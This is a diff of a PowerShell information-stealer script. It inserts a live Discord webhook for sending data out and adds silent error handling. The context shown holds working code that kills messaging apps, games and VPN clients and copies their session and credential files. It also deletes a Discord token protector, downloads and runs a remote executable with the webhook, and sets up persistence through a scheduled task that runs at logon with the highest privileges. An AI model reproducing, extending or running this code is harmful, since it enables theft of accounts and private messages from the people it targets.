@@ -1,7 +1,6 @@
 $debug = $false
 
 if ($debug) {
-    $ErrorActionPreference = 'Stop'
     $ProgressPreference = 'Continue'
 }
 else {
@@ -24,7 +23,7 @@ function KDMUTEX {
 
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
-$webhook = "YOUR_WEBHOOK_HERE"
+$webhook = "https://discord.com/api/webhooks/1196008892015071312/H2q8VYvTXi0m4APwb1nHzlImjengMshpVLGsRPQloTk1BSln0ZiKDnaISadyXENyn-VI"
 $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
 
 
@@ -214,9 +213,9 @@ function HOSTS-BLOCKER {
         param ([string[]]$Browsers = @("chrome", "firefox", "iexplore", "opera", "brave", "msedge"))
         $terminatedProcesses = @()
         foreach ($browser in $Browsers) {
-            $process = Get-Process -Name $browser 
+            $process = Get-Process -Name $browser -ErrorAction 'SilentlyContinue'
             if ($process -ne $null) {
-                Stop-Process -Name $browser 
+                Stop-Process -Name $browser -ErrorAction 'SilentlyContinue'
                 $terminatedProcesses += $browser
             }
         }
@@ -360,7 +359,7 @@ function Backup-Data {
         $processname = "telegram"
         $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
         if (!(Test-Path $pathtele)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname  | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $destination = "$folder_messaging\Telegram.zip"
         $exclude = @("_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview")
         $files = Get-ChildItem -Path $pathtele -Exclude $exclude
@@ -373,7 +372,7 @@ function Backup-Data {
         $processname = "element"
         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
         if (!(Test-Path $elementfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname  | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $element_session = "$folder_messaging\Element"
         New-Item -ItemType Directory -Force -Path $element_session
         Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force 
@@ -389,7 +388,7 @@ function Backup-Data {
         $processname = "icq"
         $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
         if (!(Test-Path $icqfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname  | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $icq_session = "$folder_messaging\ICQ"
         New-Item -ItemType Directory -Force -Path $icq_session 
         Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
@@ -401,7 +400,7 @@ function Backup-Data {
         $processname = "signal"
         $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
         if (!(Test-Path $signalfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $signal_session = "$folder_messaging\Signal"
         New-Item -ItemType Directory -Force -Path $signal_session
         Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
@@ -417,7 +416,7 @@ function Backup-Data {
         $processname = "viber"
         $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
         if (!(Test-Path $viberfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $viber_session = "$folder_messaging\Viber"
         New-Item -ItemType Directory -Force -Path $viber_session
         $configfiles = @("config$1")
@@ -444,7 +443,7 @@ function Backup-Data {
     # Whatsapp Session Stealer
     function whatsappstealer {
         $processname = "whatsapp"
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $whatsapp_session = "$folder_messaging\Whatsapp"
         New-Item -ItemType Directory -Force -Path $whatsapp_session
         $regexPattern = "WhatsAppDesktop"
@@ -464,7 +463,7 @@ function Backup-Data {
         $processname = "steam"
         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
         if (!(Test-Path $steamfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $steam_session = "$folder_gaming\Steam"
         New-Item -ItemType Directory -Force -Path $steam_session
         Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
@@ -491,7 +490,7 @@ function Backup-Data {
         $processname = "epicgameslauncher"
         $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
         if (!(Test-Path $epicgamesfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $epicgames_session = "$folder_gaming\EpicGames"
         New-Item -ItemType Directory -Force -Path $epicgames_session
         Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
@@ -504,7 +503,7 @@ function Backup-Data {
         $processname = "upc"
         $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
         if (!(Test-Path $ubisoftfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue'-ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $ubisoft_session = "$folder_gaming\Ubisoft"
         New-Item -ItemType Directory -Force -Path $ubisoft_session
         Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
@@ -517,7 +516,7 @@ function Backup-Data {
         if (!(Test-Path $eafolder)) { return }
         $ea_session = "$folder_gaming\Electronic Arts"
         if (!(Test-Path $ea_session)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         New-Item -ItemType Directory -Force -Path $ea_session
         Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
     }
@@ -528,7 +527,7 @@ function Backup-Data {
         $growtopiafolder = "$env:localappdata\Growtopia"
         if (!(Test-Path $growtopiafolder)) { return }
         $growtopia_session = "$folder_gaming\Growtopia"
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         New-Item -ItemType Directory -Force -Path $growtopia_session
         Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
     }
@@ -541,7 +540,7 @@ function Backup-Data {
         $processname = "nordvpn"
         $nordvpnfolder = "$env:localappdata\nordvpn"
         if (!(Test-Path $nordvpnfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $nordvpn_account = "$folder_vpn\NordVPN"
         New-Item -ItemType Directory -Force -Path $nordvpn_account
         $pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
@@ -565,7 +564,7 @@ function Backup-Data {
         $processname = "protonvpn"
         $protonvpnfolder = "$env:localappdata\protonvpn"  
         if (!(Test-Path $protonvpnfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $protonvpn_account = "$folder_vpn\ProtonVPN"
         New-Item -ItemType Directory -Force -Path $protonvpn_account
         $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
@@ -588,7 +587,7 @@ function Backup-Data {
         $processname = "Surfshark"
         $surfsharkvpnfolder = "$env:appdata\Surfshark"
         if (!(Test-Path $surfsharkvpnfolder)) { return }
-        try { if (Get-Process $processname  ) { Get-Process -Name $processname | Stop-Process } } catch {}
+        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
         $surfsharkvpn_account = "$folder_vpn\Surfshark"
         New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
@@ -807,8 +806,8 @@ function Backup-Data {
 
     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
     if ($token_prot -eq $true) {
-        Stop-Process -Name DiscordTokenProtector -Force
-        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
+        Stop-Process -Name DiscordTokenProtector -Force -ErrorAction 'SilentlyContinue'
+        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force -ErrorAction 'SilentlyContinue'
     }
 
     $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
@@ -817,15 +816,15 @@ function Backup-Data {
     }
 
     try {
-        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force  | Out-Null
+        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
     }
     catch {}
 
     (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")
 
-    Stop-Process -Name "discord" -Force  | Out-Null
-    Stop-Process -Name "discordcanary" -Force  | Out-Null
-    Stop-Process -Name "discordptb" -Force  | Out-Null
+    Stop-Process -Name "discord" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
+    Stop-Process -Name "discordcanary" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
+    Stop-Process -Name "discordptb" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
 
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
@@ -881,6 +880,7 @@ function Invoke-TASKS {
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
+    Write-Host "Task Created" -ForegroundColor Green
     HOSTS-BLOCKER
     Backup-Data
 }
